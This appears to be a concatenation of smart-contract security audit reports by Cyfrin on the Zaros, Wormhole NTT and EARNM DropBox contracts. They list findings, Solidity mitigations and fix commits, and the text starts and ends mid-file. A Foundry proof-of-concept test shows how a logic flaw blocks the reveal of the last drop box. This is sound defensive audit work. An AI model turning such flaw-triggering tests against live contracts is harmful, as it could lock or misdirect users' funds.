        hex"5b60003560e01c8063abe770f2146100296101d8015780632b73eefa146100716101d80157600080fd5b36600460003760005131505a6000600060405160606000515afa905a60800190036000523d600060603e6100606101d801573d6060fd5b60406020523d6040523d6060016000f35b36600460003760005131505a600060006040516060346000515af1905a60820190036000523d600060603e6100a96101d801573d6060fd5b60406020523d6040523d6060016000f3"
    );
    uint256 internal constant _HUFF_GAS_METER_COMPILED_BYTECODE_OFFSET = 472;

    function meterStaticCall(
        address /*addr*/,
        bytes memory /*data*/
    ) external view returns (uint256 gasUsed, bytes memory returnData) {
        function() internal pure huffGasMeter;
        assembly {
            huffGasMeter := _HUFF_GAS_METER_COMPILED_BYTECODE_OFFSET
        }
        huffGasMeter();

        // Just to trick the compiler into including the bytecode
        // This code will never be executed, because huffGasMeter() will return or revert
        bytes memory r = _HUFF_GAS_METER_COMPILED_BYTECODE;
        return (r.length, r);
    }

    function meterCall(
        address /*addr*/,
        bytes memory /*data*/
    ) external returns (uint256 gasUsed, bytes memory returnData) {
        function() internal pure huffGasMeter;
        assembly {
            huffGasMeter := _HUFF_GAS_METER_COMPILED_BYTECODE_OFFSET
        }
        huffGasMeter();

        // Just to trick the compiler into including the bytecode
        // This code will never be executed, because huffGasMeter() will return or revert
        bytes memory r = _HUFF_GAS_METER_COMPILED_BYTECODE;
        return (r.length, r);
    }
}
```

**Recommended Mitigation:**
```solidity
SD59x18 cachedVal = indexPriceX18.intoSD59x18();

UD60x18 priceBeforeDelta = cachedVal.add(cachedVal.mul(priceImpactBeforeDelta)).intoUD60x18();
UD60x18 priceAfterDelta  = cachedVal.add(cachedVal.mul(priceImpactAfterDelta)).intoUD60x18();
```

**Zaros:** Fixed in commit [e0396d3](https://github.com/zaros-labs/zaros-core/commit/e0396d35386d00be97b20bb81c7f70c17851e636).

**Cyfrin:** Verified.


### Use input `amount` in `TradingAccountBranch::withdrawMargin` when calling `safeTransfer`

**Description:** Remove redundant conversion by using input `amount` in `TradingAccountBranch::withdrawMargin` when [calling](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/TradingAccountBranch.sol#L298-L300) `safeTransfer` at the end:

```diff
- uint256 tokenAmount = marginCollateralConfiguration.convertUd60x18ToTokenAmount(ud60x18Amount);
- IERC20(collateralType).safeTransfer(msg.sender, tokenAmount);
+IERC20(collateralType).safeTransfer(msg.sender, amount);
```

**Zaros:** Fixed in commit [a4d64ac](https://github.com/zaros-labs/zaros-core/commit/a4d64acf400561143b3e261037d6dd152b85c9a4).

**Cyfrin:** Verified.


### Remove redundant `unary` call from `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd`

**Description:** `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` [L239](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/TradingAccount.sol#L239) does this:
```solidity
UD60x18 markPrice = perpMarket.getMarkPrice(unary(sd59x18(position.size)), perpMarket.getIndexPrice());
```

The `unary` [function](https://github.com/PaulRBerg/prb-math/blob/main/src/sd59x18/Helpers.sol#L88-L90) takes as input a `SD59x18`, unwraps it, applies `-` to change sign then re-wraps it. Hence there is no point wrapping `position.size` first; simply apply `-` on the native type then wrap it.

**Recommended Mitigation:** Use this more efficient and simpler version:
```solidity
UD60x18 markPrice = perpMarket.getMarkPrice(sd59x18(-position.size), perpMarket.getIndexPrice());
```

The same change could also be made in `LiquidationBranch::liquidateAccounts`, eg:
```diff
ctx.oldPositionSizeX18 = sd59x18(position.size);
- ctx.liquidationSizeX18 = unary(ctx.oldPositionSizeX18);
+ ctx.liquidationSizeX18 = sd59x18(-position.size);
```

**Zaros:** Fixed in commit [5ffe8f4](https://github.com/zaros-labs/zaros-core/commit/5ffe8f4a1e07a322f3d1ce9da6ec885dd7d69c3c).

**Cyfrin:** Verified.


### Needless addition in `TradingAccount::withdrawMarginUsd`

**Description:** Needless addition in `TradingAccount::withdrawMarginUsd` since this is an output variable that has no prior assignment or value:
```solidity
File: TradingAccount.sol
371:             withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(amountUsdX18);
380:             withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(marginToWithdrawUsdX18);
```

**Recommended Mitigation:**
```diff
- 371:             withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(amountUsdX18);
- 380:             withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(marginToWithdrawUsdX18);

+ 371:             withdrawnMarginUsdX18 = amountUsdX18;
+ 380:             withdrawnMarginUsdX18 = marginToWithdrawUsdX18;
```

**Zaros:** Fixed in commit [672a08b](https://github.com/zaros-labs/zaros-core/commit/672a08b93e288242e6d4088aa1e60a771053982c).

**Cyfrin:** Verified.


### `LiquidationKeeper::checkUpkeep` should only continue processing if lower bounds are smaller than upper bounds

**Description:** `LiquidationKeeper::checkUpkeep` should only continue processing if `checkLowerBound < checkUpperBound || performLowerBound < performUpperBound` at L70.

Currently the revert check uses `>` instead of `>=` but if `checkLowerBound == checkUpperBound` then `LiquidationBranch::checkLiquidatableAccounts` will simply return an empty output array so there's no point in calling that function.

**Recommended Mitigation:**
```diff
- if (checkLowerBound  > checkUpperBound || performLowerBound > performUpperBound) {
+ if (checkLowerBound >= checkUpperBound || performLowerBound >= performUpperBound) {
    revert Errors.InvalidBounds();
}
```

**Zaros:** Fixed in commit [843b412](https://github.com/zaros-labs/zaros-core/commit/843b4122efe567256b9a0d3d4c5bfcb3ec672ef3).

**Cyfrin:** Resolved.


### Fail fast in `LiquidationBranch::checkLiquidatableAccounts`

**Description:** In `LiquidationBranch::checkLiquidatableAccounts` there is no point calling `GlobalConfiguration::load` if the function is going to exit early because `upperBound - lowerBound == 0`. Hence only load global config if this isn't the case.

**Recommended Mitigation:**
```solidity
function checkLiquidatableAccounts() returns (uint128[] memory liquidatableAccountsIds) {
{
    liquidatableAccountsIds = new uint128[](upperBound - lowerBound);
    if (liquidatableAccountsIds.length == 0) return liquidatableAccountsIds;

    // @audit only load global config if we didn't fail fast
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();

    for (uint256 i = lowerBound; i < upperBound; i++) {
```

**Zaros:** Fixed in commit [969e43d](https://github.com/zaros-labs/zaros-core/commit/969e43de03f64df7fe5aa52377a3b64eab64019f).

**Cyfrin:** Verified.


### Fail fast in `LiquidationBranch::liquidateAccounts`

**Description:** In `LiquidationBranch::liquidateAccounts` there is no point calling `GlobalConfiguration::load` if the function is going to exit early because `accountsIds.length == 0`. Hence only load global config if this isn't the case.

**Recommended Mitigation:**
```solidity
function liquidateAccounts(uint128[] calldata accountsIds, address liquidationFeeRecipient) external {
    // @audit fail fast
    if (accountsIds.length == 0) return;

    // load global config
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();

    // only authorized liquidators are able to liquidate
    if (!globalConfiguration.isLiquidatorEnabled[msg.sender]) {
        revert Errors.LiquidatorNotRegistered(msg.sender);
    }
```

**Zaros:** Fixed in commit [c004e8f](https://github.com/zaros-labs/zaros-core/commit/c004e8f5badabf81521b41dac549ae126a30fa60).

**Cyfrin:** Verified.


### Remove boolean condition that will always be `false` from `LiquidationBranch::liquidateAccounts`

**Description:** Consider this section of code from `LiquidationBranch::liquidateAccounts`:
```solidity
// if account is not liquidatable, skip to next account
// account is liquidatable if requiredMaintenanceMarginUsdX18 > ctx.marginBalanceUsdX18
if (!TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, ctx.marginBalanceUsdX18)) {
    continue;
}

UD60x18 liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
    feeRecipients: FeeRecipients.Data({
        marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
        orderFeeRecipient: address(0),
        settlementFeeRecipient: liquidationFeeRecipient
    }),
    pnlUsdX18: ctx.marginBalanceUsdX18.gt(requiredMaintenanceMarginUsdX18.intoSD59x18())
        ? ctx.marginBalanceUsdX18.intoUD60x18()
        : requiredMaintenanceMarginUsdX18,
```

When determining what to use for input variable `pnlUsdX18`, it checks if `ctx.marginBalanceUsdX18 > requiredMaintenanceMarginUsdX18`.

However it is impossible for this to be true since the call to `TradingAccount::isLiquidatable` has already affirmed that `requiredMaintenanceMarginUsdX18 > ctx.marginBalanceUsdX18`.

**Recommended Mitigation:**
```solidity
pnlUsdX18: requiredMaintenanceMarginUsdX18
```

**Zaros:** Fixed in commit [492a3cf](https://github.com/zaros-labs/zaros-core/commit/492a3cf4c82bea55ab1a1b4497ac30099df67ed2).

**Cyfrin:** Verified.


### Optimize away `liquidatedCollateralUsdX18` variable from `LiquidationBranch::liquidateAccounts`

**Description:** The `liquidatedCollateralUsdX18` variable is used to store the return value of `TradingAccount::deductAccountMargin`, then the only other use is to assign it to `ctx.liquidatedCollateralUsdX18`.

Hence it can be simply optimized away by performing the assignment directly to `ctx.liquidatedCollateralUsdX18`.

**Recommended Mitigation:**
```solidity
ctx.liquidatedCollateralUsdX18 = ctx.liquidatedCollateralUsdX18.add(tradingAccount.deductAccountMargin({...
```
**Zaros:** Fixed in commit [e2fa7cd](https://github.com/zaros-labs/zaros-core/commit/e2fa7cdc4e85dde073608b5f7393eda649cadb99).

**Cyfrin:** Verified.


### Don't read `position.size` from storage after `position` has been reset in `LiquidationBranch::liquidateAccounts`

**Description:** Consider this code:
```solidity
// reset the position
position.clear();

tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD_ZERO);

// @audit `position` has just been reset so there is no point in reading
// `position.size` from storage as it will always be zero
(ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
    ctx.liquidationSizeX18, ctx.oldPositionSizeX18, sd59x18(position.size), false
);
```

Here `position` has just been reset then in the call to `PerpMarket::checkOpenInterestLimits` for the third parameter, the value 0 will always be read from storage when reading `position.size`. There is no point in paying the cost of a storage read; just pass 0.

**Recommended Mitigation:**
```solidity
(ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
    ctx.liquidationSizeX18, ctx.oldPositionSizeX18, sd59x18(0), false
);
```

Or even better following the recommendation from the finding `Use constants for sd59x18(0) and ud60x18(0)`, use named imports to import the `prb-math` defined constant:

```solidity
import { UD60x18, ud60x18, ZERO as UD60x18_ZERO } from "@prb-math/UD60x18.sol";
import { SD59x18, sd59x18, ZERO as SD59x18_ZERO } from "@prb-math/SD59x18.sol";

(ctx.newOpenInterestX18, ctx.newSkewX18) = perpMarket.checkOpenInterestLimits(
    ctx.liquidationSizeX18, ctx.oldPositionSizeX18, SD59x18_ZERO, false
);
```

**Zaros:** Fixed in commit [e4fae03](https://github.com/zaros-labs/zaros-core/commit/e4fae0336c4c1e93f62d0198173628567fe90be0).

**Cyfrin:** Verified.


### Fail fast in `PerpMarket::checkOpenInterestLimits`

**Description:** In `PerpMarket::checkOpenInterestLimits` there is no point in calculating `newSkew` if the transaction is going to revert because `newOpenInterest > maxOpenInterest`.

**Recommended Mitigation:** Only calculate `newSkew` if the revert doesn't happen:
```solidity
// calculate new open interest which would result from proposed trade
// by subtracting old position size then adding new position size to
// current open interest
newOpenInterest = ud60x18(self.openInterest).sub(oldPositionSize.abs().intoUD60x18()).add(
    newPositionSize.abs().intoUD60x18()
);

// revert if newOpenInterest > maxOpenInterest
if (newOpenInterest.gt(maxOpenInterest)) {
    revert Errors.ExceedsOpenInterestLimit(
        self.id, maxOpenInterest.intoUint256(), newOpenInterest.intoUint256()
    );
}

// calculate new skew if txn didn't revert
newSkew = sd59x18(self.skew).add(sizeDelta);
```

**Zaros:** Fixed in commit [21603c9](https://github.com/zaros-labs/zaros-core/commit/21603c9ff13a6bf39786f1ce6ed1a7321e719a52).

**Cyfrin:** Verified.


### Cache `self.skew` in `PerpMarket::checkOpenInterestLimits` to avoid reading same value from storage twice

**Description:** Cache `self.skew` in `PerpMarket::checkOpenInterestLimits` to avoid reading the same value from storage twice:
```solidity
// cache skew
SD59x18 currentSkew = sd59x18(self.skew);

// calculate new skew using cached skew
newSkew = currentSkew.add(sizeDelta);

// calculate bool using cached skew
bool isReducingSkew = currentSkew.abs().gt(newSkew.abs());
```

This saves 1 storage read and 1 wrapping call to `sd59x18`.

**Zaros:** Fixed in commit [94087ac](https://github.com/zaros-labs/zaros-core/commit/94087acb83da39ce083481d8ba1f2d8b7709d827).

**Cyfrin:** Verified.


### In `PerpMarket::checkOpenInterestLimits` only calculate `isReducingSkew` if `shouldCheckMaxSkew == true`

**Description:** There is no point in calculating `isReducingSkew` every time since it is only used when `shouldCheckMaxSkew == true`. Hence refactor to only calculate in this case:
```solidity
if(shouldCheckMaxSkew && newSkew.abs().gt(ud60x18(self.configuration.maxSkew).intoSD59x18()) {
    // determine whether skew is being reduced or not
    bool isReducingSkew = sd59x18(self.skew).abs().gt(newSkew.abs());

    if(!isReducingSkew) revert Errors.ExceedsSkewLimit(self.id, self.configuration.maxSkew, newSkew.intoInt256());
}
```

**Zaros:** Fixed in commit [fead6f5](https://github.com/zaros-labs/zaros-core/commit/fead6f59ddbd8a8d73a786cb43e2f4f8fa0bad6a).

**Cyfrin:** Verified.


### Cache `sd59x18(sizeDelta)` in `OrderBranch::simulateTrade` to prevent wrapping the same value 3 additional times

**Description:** Cache `sd59x18(sizeDelta)` in `OrderBranch::simulateTrade` to prevent wrapping the same value 3 additional times.

**Zaros:** Fixed in commit [d2b2b89](https://github.com/zaros-labs/zaros-core/commit/d2b2b895a3d684f418d29bd49b79640e855cc86d).

**Cyfrin:** Verified.


### Use constants for `sd59x18(0)` and `ud60x18(0)`

**Description:** `prb-math` provides constants for `sd59x18(0)` and `ud60x18(0)` to avoid having to continuously calculate them or define your own constants.

**Recommended Mitigation:** Use aliased imports to prevent naming clashes:
```solidity
import { UD60x18, ud60x18, ZERO as UD60x18_ZERO } from "@prb-math/UD60x18.sol";
import { SD59x18, sd59x18, ZERO as SD59x18_ZERO } from "@prb-math/SD59x18.sol";
```

Then use the aliased imports in `OrderBranch` and `LiquidationBranch` where `sd59x18(0)` is currently used.

**Zaros:** Fixed in commit [5ff99a3](https://github.com/zaros-labs/zaros-core/commit/5ff99a352eb7e76aac54f425a9f494720d068cbe).

**Cyfrin:** Verified.


### Fail fast in `OrderBranch::createMarketOrder`

**Description:** In `OrderBranch::createMarketOrder` there is no point in loading a bunch of stuff from storage only to then check and revert if the input parameters are incorrect or if the market is not enabled.

**Recommended Mitigation:** Generally we want to fail as quickly as possible; a good strategy is to:
* check input parameters first
* load something from storage (eg global config data)
* perform checks against that thing we just loaded from storage
* load next thing from storage and check against that

```solidity
function createMarketOrder(CreateMarketOrderParams calldata params) external {
    // @audit check input params first
    if (params.sizeDelta == 0) revert Errors.ZeroInput("sizeDelta");

    // @audit load global config and check against it
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
    globalConfiguration.checkMarketIsEnabled(params.marketId);

    // @audit load the next thing and perform checks against that and so on..
```

Similarly applies to `SettlementBranch::_fillOrder`.

**Zaros:** Fixed in commit [5fd1f9f](https://github.com/zaros-labs/zaros-core/commit/5fd1f9fcc55f4ab4cdd4cefdaaf2a72b6f544ae8).

**Cyfrin:** Verified.


### Multiple levels of abstraction result in the same values being repeatedly read from storage over and over again

**Description:** Multiple levels of abstraction in the codebase result in the same values being repeatedly read from storage over and over again.

For example, `SettlementBranch::_fillOrder` should cache `oldPosition.size` to prevent reading the same value from storage multiple times; one possible place to put the cached copy is inside `FillOrderContext` using the `SD59x18` type to also save converting it every time.

But because of the multiple levels of abstraction, even if the above is implemented the same unchanged value will still be repeatedly read from storage inside:
* the call to `TradingAccount::getAccountMarginRequirementUsdAndUnrealizedPnlUsd` which will also load the old position and read its size from storage
* the calls to `Position::getUnrealizedPnl` and `getAccruedFunding` for `oldPosition` which also internally read the same unchanged `size` from storage

**Recommended Mitigation:** Zaros is only planning to deploy on L2s where the current gas costs are cheap. Even so it may be useful to think about how the abstraction layers could be designed to minimize reading the same values from storage over and over again. Ideally values which don't change would be read from storage once then passed as inputs to subsequent calls as needed.

**Zaros:** Acknowledged; we have fixed some of the storage reads per the recommendations but will defer significant refactoring for a later release.


### Return fast in `TradingAccountBranch::getAccountLeverage` when margin balance is zero

**Description:** Return fast in `TradingAccountBranch::getAccountLeverage` when margin balance is zero:
```solidity
function getAccountLeverage(uint128 tradingAccountId) external view returns (UD60x18) {
    TradingAccount.Data storage tradingAccount = TradingAccount.loadExisting(tradingAccountId);

    SD59x18 marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(tradingAccount.getAccountUnrealizedPnlUsd());

    // @audit no need to calculate position notional value if margin balance is zero
    if(marginBalanceUsdX18.isZero()) return marginBalanceUsdX18.intoUD60x18();

    UD60x18 totalPositionsNotionalValue;

    for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
        uint128 marketId = tradingAccount.activeMarketsIds.at(i).toUint128();

        PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);
        Position.Data storage position = Position.load(tradingAccountId, marketId);

        UD60x18 indexPrice = perpMarket.getIndexPrice();
        UD60x18 markPrice = perpMarket.getMarkPrice(unary(sd59x18(position.size)), indexPrice);

        UD60x18 positionNotionalValueX18 = position.getNotionalValue(markPrice);
        totalPositionsNotionalValue = totalPositionsNotionalValue.add(positionNotionalValueX18);
    }

    return totalPositionsNotionalValue.intoSD59x18().div(marginBalanceUsdX18).intoUD60x18();
}
```

**Zaros:** Fixed in commit [8ae8340](https://github.com/zaros-labs/zaros-core/commit/8ae8340aca00f7db9fadb63b7427266b29a38bc5).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-07-13-cyfrin-zaros-v2.0.md ------


------ FILE START car/reports_md/2024-07-23-cyfrin-wormhole-NTT-Diff-v1.0.md ------

**Lead Auditors**

[0kage](https://x.com/0kage_eth)

[Giovanni Di Siena](https://x.com/giovannidisiena)



**Assisting Auditors**

[Hans](https://x.com/hansfriese)

---

# Findings
## Informational


###  Incorrectly documented error selector

**Description:** The `bytes4` error selector for the `IWormholeTransceiver::TransferAlreadyCompletedError` is incorrectly documented as `0x406e719e`. The correct selector is `0xb4c3b00c`.

```solidity
    /// @notice Error when the VAA has already been consumed.
    /// @dev Selector: 0x406e719e.
    /// @param vaaHash The hash of the VAA.
    error TransferAlreadyCompleted(bytes32 vaaHash);
```

**Recommended Mitigation:** Consider updating the selector to `0xb4c3b00c`.


### Inconsistent inline documentation for errors and events

**Description:** The current codebase follows an inline documentation standard for events and errors, including parameter descriptions and `topic[0]` for events and `bytes4` selectors for errors. However, some events and errors lack either parameter descriptions, selectors, or both. This inconsistency can reduce code readability and maintainability.

Here are a few examples from `INttManager.sol`

```solidity
    /// @notice The caller is not the deployer.
    error UnexpectedDeployer(address expectedOwner, address owner);

    /// @notice Peer for the chain does not match the configuration.
    /// @param chainId ChainId of the source chain.
    /// @param peerAddress Address of the peer nttManager contract.
    error InvalidPeer(uint16 chainId, bytes32 peerAddress);

   /// @notice Peer chain ID cannot be zero.
    error InvalidPeerChainIdZero();

    /// @notice Peer cannot be the zero address.
    error InvalidPeerZeroAddress();

    /// @notice Peer cannot have zero decimals.
    error InvalidPeerDecimals();

```

**Recommended Mitigation:** Ensure consistent documentation across all event and error definitions by including parameter descriptions, `topic[0]` and `bytes4` selectors where applicable.



### Lack of events for setting inbound and outbound limits

**Description:** The `NttManager::setPeer` function sets a peer `NttManager` contract address on a foreign chain. The `inboundLimit` is now passed as an input when setting a peer contract. In the earlier implementation, inboundLimit was set to `type(uint64).max`. However, this input is missing from the `PeerUpdated` event, which does not reflect the change in the `setPeer` input parameters.

**Recommended Mitigation:** Consider including the `inboundLimit` as part of the `PeerUpdated` event to accurately reflect the parameters set by the `setPeer` function. Additionally, in the context of third party integrations, since the inbound and outbound limits might be updated multiple times for different destination chains, it is recommended to add an event emission whenever the `NttManager` owner sets the inbound or outbound limit. This will improve transparency and traceability of these parameter changes.



### Lack of indexing in `TransferSent` event

**Description:** The `INttManager::TransferSent` event is emitted when a message is sent from the `NttManager` of the source chain. The current event signature does not index the `recipient` and `refundAddress` parameters. When transfers are performed at scale, this lack of indexing might impede the searchability of transfers across chains.

**Recommended Mitigation:** Consider indexing the `recipient` and `refundAddress` parameters in the `TransferSent` event for improved searchability.


\clearpage

------ FILE END car/reports_md/2024-07-23-cyfrin-wormhole-NTT-Diff-v1.0.md ------


------ FILE START car/reports_md/2024-08-15-cyfrin-earnm-dropbox-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

**Assisting Auditors**

 


---

# Findings
## Critical Risk


### Impossible to reveal any drop boxes linked to codes once enough codes have been associated such that `remainingBoxesAmount == 0`

**Description:** In `DropBox::associateOneTimeCodeToAddress`, the `boxAmount` linked to allocated codes is deducted from `remainingBoxesAmount` storage:
```solidity
// Decrease the amount of boxes remaining to mint, since they are now associated to be minted
remainingBoxesAmount -= boxAmount;
```

Then in `DropBox::revealDropBoxes` when the user attempts to reveal the boxes previously linked with a code, if all the codes have been previously associated such that `remainingBoxesAmount == 0` the following safety checks cause the transaction to erroneously revert with `NoMoreBoxesToMint` error:
```solidity
// @audit read current `remainingBoxesAmount` from storage
// the box amount linked with this code has already been
// previously deducted in `associateOneTimeCodeToAddress`
uint256 remainingBoxesAmountCache = remainingBoxesAmount;

// @audit since the box amount linked with this code has
// already been deducted from `remainingBoxesAmount`, if
// all codes have been associated, even though not all codes have been
// revealed attempting to reveal any codes will erroneously revert since
// remainingBoxesAmountCache == 0
if (remainingBoxesAmountCache == 0) revert NoMoreBoxesToMint();

// @audit even if the previous check was removed, the transaction would
// still revert here since remainingBoxesAmountCache == 0 but
// oneTimeCodeData.boxAmount > 0
if (remainingBoxesAmountCache < oneTimeCodeData.boxAmount) revert NoMoreBoxesToMint();
```

**Impact:** Once all codes have been associated it is impossible to use any codes to reveal boxes. This makes it impossible to mint the remaining drop boxes linked to the associated but unrevealed codes and hence makes it impossible to claim the `EARNM` tokens associated with them.

**Proof of Concept:** Firstly in `test/DropBox/DropBox.t.sol` change the number of boxes such that there is only 1 box:
```diff
    dropBox = new DropBoxMock(
      address(users.operatorOwner),
      "https://api.example.com/",
      "https://api.example.com/contract",
      address(earnmERC20Token),
      address(users.apiAddress),
      [10_000_000, 1_000_000, 100_000, 10_000, 2500, 750],
-     [1, 10, 100, 1000, 2000, 6889],
+     [uint16(1), 0, 0, 0, 0, 0],
      ["Mythical Box", "Legendary Box", "Epic Box", "Rare Box", "Uncommon Box", "Common Box"],
      address(vrfHandler)
    );
```

Then add the PoC function to `test/DropBox/behaviors/revealDropBoxes.t.sol`:
```solidity
  function test_revealDropBoxes_ImpossibleToMintLastBox() public {
    string memory code = "validCode";
    uint32 boxAmount = 1;

    _setupAndAllowReveal(code, users.stranger, boxAmount);
    _mockVrfFulfillment(code, users.stranger, boxAmount);
    _validateMinting(dropBox.mock_getMintedTierAmounts(), boxAmount, code);
  }
```

Run the PoC with: `forge test --match-test test_revealDropBoxes_ImpossibleToMintLastBox -vvv`.

The PoC stack trace shows it fails to reveal the last and only box due to `[Revert] NoMoreBoxesToMint()` in `DropBoxMock::revealDropBoxes`.

Commenting out the `remainingBoxesAmountCache` checks in `DropBox::revealDropBoxes` then re-running the PoC shows that the last box can now be revealed.

**Recommended Mitigation:** Remove the `remainingBoxesAmountCache` checks from `DropBox::revealDropBoxes` since the boxes associated with codes are already deducted inside `DropBox::associateOneTimeCodeToAddress`.

**Mode:**
Fixed in commit [974fd2c](https://github.com/Earnft/dropbox-smart-contracts/commit/974fd2ce72b9e2d3c0355fdddb303c7c0146a692).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### `DropBox::tokenURI` returns data for non-existent `tokenId` violating `EIP721`

**Description:** `DropBox::tokenURI` overrides OpenZeppelin's default implementation with the following code:
```solidity
function tokenURI(uint256 tokenId) public view override returns (string memory) {
  return string(abi.encodePacked(bytes(_baseTokenURI), Strings.toString(tokenId), ".json"));
}
```

This implementation does not check that `tokenId` exists and hence will return data for non-existent `tokenId`. This is in contrast to OpenZeppelin's [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L88-L93) and contrary to [EIP721](https://eips.ethereum.org/EIPS/eip-721) which states:

```solidity
/// @notice A distinct Uniform Resource Identifier (URI) for a given asset.
/// @dev Throws if `_tokenId` is not a valid NFT. URIs are defined in RFC
///  3986. The URI may point to a JSON file that conforms to the "ERC721
///  Metadata JSON Schema".
function tokenURI(uint256 _tokenId) external view returns (string);
```

**Impact:** Apart from simply returning incorrect data, the most likely negative effect is integration problems with NFT marketplaces.

**Recommended Mitigation:** Revert if `tokenId` does not exist:
```diff
function tokenURI(uint256 tokenId) public view override returns (string memory) {
+ _requireOwned(tokenId);
  return string(abi.encodePacked(bytes(_baseTokenURI), Strings.toString(tokenId), ".json"));
}
```

**Mode:**
Fixed in commit [2d8c3c0](https://github.com/Earnft/dropbox-smart-contracts/commit/2d8c3c0142f70fae183f1185ea1987a0707711ef).

**Cyfrin:** Verified.


### Use upgradeable or replaceable `VRFHandler` contracts when interacting with Chainlink VRF

**Description:** Cyfrin has been made aware by our private audit clients that Chainlink intends on bricking VRF 2.0 at the end of November 2024 such that _"VRF 2.0 will stop working"_ even for existing subscriptions.

**Impact:** All immutable contracts dependent on VRF 2.0 will be bricked when Chainlink bricks VRF 2.0. The same will apply in the future to immutable contracts depending on VRF 2.5 when/if Chainlink does the same to it.

**Recommended Mitigation:** Immutable contracts should be insulated from directly interacting with Chainlink VRF. One way to achieve this is to create a separate `VRFHandler` contract that acts as a bridge between immutable contracts and Chainlink VRF; this contract should:
* be either a replaceable immutable contract using [VRFConsumerBaseV2Plus](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol) such that a new `VRFHandler` can be deployed, or an upgradeable contract using [VRFConsumerBaseV2Upgradeable](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Upgradeable.sol)
* allow the contract owner to set the address of the immutable contract (and vice versa in the immutable contract to set the address of the `VRF Handler`)
* provide an API to the immutable contract that will not need to change
* handle all the Chainlink VRF API calls and callbacks, passing randomness back to the immutable contract as required

**Mode:**
Fixed in commit [dc3412f](https://github.com/Earnft/dropbox-smart-contracts/commit/dc3412fda8bf988bac579d215c1b7f8f58b973a1) by implementing a replaceable immutable `VRFHandler` contract to act as a bridge between `DropBox` and Chainlink VRF.

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Protocol can collect less or more fees than expected due to constant `claimFee` per transaction regardless of how many boxes are claimed

**Description:** `DropBox::claimDropBoxes` allows users to pass an array of `boxIds` to claim per transaction while charging a constant `claimFee` per transaction:
```solidity
// Require that the user sends a fee of "claimFee" amount
if (msg.value != claimFee) revert InvalidClaimFee();
```

This means that (not including gas fees):
* claiming 1 box costs the same as claiming 100 boxes, if done in the 1 transaction
* claiming 100 boxes 1-by-1 costs 100x more than claiming 100 boxes in 1 transaction

**Impact:** The protocol will collect:
* less fees if users claim batches of boxes
* more fees if users claim boxes one-by-one

**Recommended Mitigation:** Charge `claimFee` per transaction taking into account the number of boxes being claimed, eg:
```solidity
// Require that the user sends a fee of "claimFee" amount per box
if (msg.value != claimFee * _boxIds.length) revert InvalidClaimFee();
```

**Mode:**
Acknowledged; this was required by the product specification.


### Use inheritance order from most "base-like" to "most-derived" so `super` will call correct parent function in `DropBox::supportsInterface`

**Description:** Use inheritance order from most "base-like" to "most-derived"; this is considered good practice and can be important since Solidity [searches](https://solidity-by-example.org/inheritance/) for parent functions from right to left.

`DropBox` inherits and overrides the following function from two different parent contracts and calls `super`:
```solidity
  function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721C, ERC2981) returns (bool) {
    return super.supportsInterface(interfaceId);
  }
```

The current ordering is:
```solidity
contract DropBox is OwnableBasic, ERC721C, BasicRoyalties, ReentrancyGuard, DropBoxFractalProtocol, IVRFHandlerReceiver {
```

As Solidity searches from right to left, this will bypass `ERC721C::supportsInterface` and instead execute `ERC2981::supportsInterface` since `BasicRoyalties` appears after `ERC721C` in the inheritance order.

`ERC2981::supportsInterface` ends up [executing](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/common/ERC2981.sol#L22-L55) `ERC165::supportsInterface` but `ERC721C::supportsInterface` explicitly intends to override `ERC165::supportsInterface`:
```solidity
    /**
     * @notice Indicates whether the contract implements the specified interface.
     * @dev Overrides supportsInterface in ERC165.
     * @param interfaceId The interface id
     * @return true if the contract implements the specified interface, false otherwise
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return
        interfaceId == type(ICreatorToken).interfaceId ||
        interfaceId == type(ICreatorTokenLegacy).interfaceId ||
        super.supportsInterface(interfaceId);
    }
```

Hence due to the current inheritance order `DropBox::supportsInterface` will bypass `ERC721C::supportsInterface` to execute `ERC2981::supportsInterface`  and `ERC165::supportsInterface` which appears to be incorrect.

**Recommended Mitigation:** File: `DropBox.sol`:
```diff
- contract DropBox is OwnableBasic, ERC721C, BasicRoyalties, ReentrancyGuard, DropBoxFractalProtocol, IVRFHandlerReceiver {
+ contract DropBox is IVRFHandlerReceiver, DropBoxFractalProtocol, ReentrancyGuard, OwnableBasic, BasicRoyalties, ERC721C {

  function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721C, ERC2981) returns (bool) {
-    return super.supportsInterface(interfaceId);
// @audit make it explicit which parent function to call
+   return ERC721C.supportsInterface(interfaceId);
  }
```

File: `VRFHandler.sol`:
```diff
- contract VRFHandler is VRFConsumerBaseV2Plus, IVRFHandler {
